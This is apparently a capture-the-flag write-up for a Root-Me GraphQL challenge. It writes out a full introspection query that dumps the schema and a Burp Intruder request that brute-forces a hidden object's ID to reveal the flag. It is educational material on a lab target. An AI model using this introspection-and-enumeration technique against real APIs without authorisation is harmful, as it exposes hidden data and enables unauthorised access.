The first step is to find the endpoint:

We send a query to one of the different countries with Burp running behind it, and we get our endpoint: /rocketql .

We can send our query to Burp's Repeater to easily send new queries.

To find out if introspection is enabled and exploit it if it is: we can make the following query:

{“query”:"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{... InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{... TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
GraphQl returns the complete database schema, which can be copied and pasted into GraphQl Voyager.

The schema is then very easy to read:
 rockets: containing information on rockets
 IAmNotHere: which most probably contains our flag, itself composed of
- an ID: very_long_id
- a string: very_long_value

The aim is to find the right ID to point to our flag.

With Burp, we can simply bruteforced our id. In the intruder, we prepare the following request:

POST /rocketql HTTP/1.1
Host: challenge01.root-me.org:59077
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge01.root-me.org:59077/
Content-Type: application/json
Origin: http://challenge01.root-me.org:59077
Content-Length: 57
Connection: close

{“query”:“{IAmNotHere(very_long_id:§FUZZ§){very_long_value}}”}
And in the Payloads tab, we configure a Numbers payload of type 1 to 100 going from 1 to 1. We launch...

And at ID 17, we get our flag! Congratulations, you can use this flag : RM...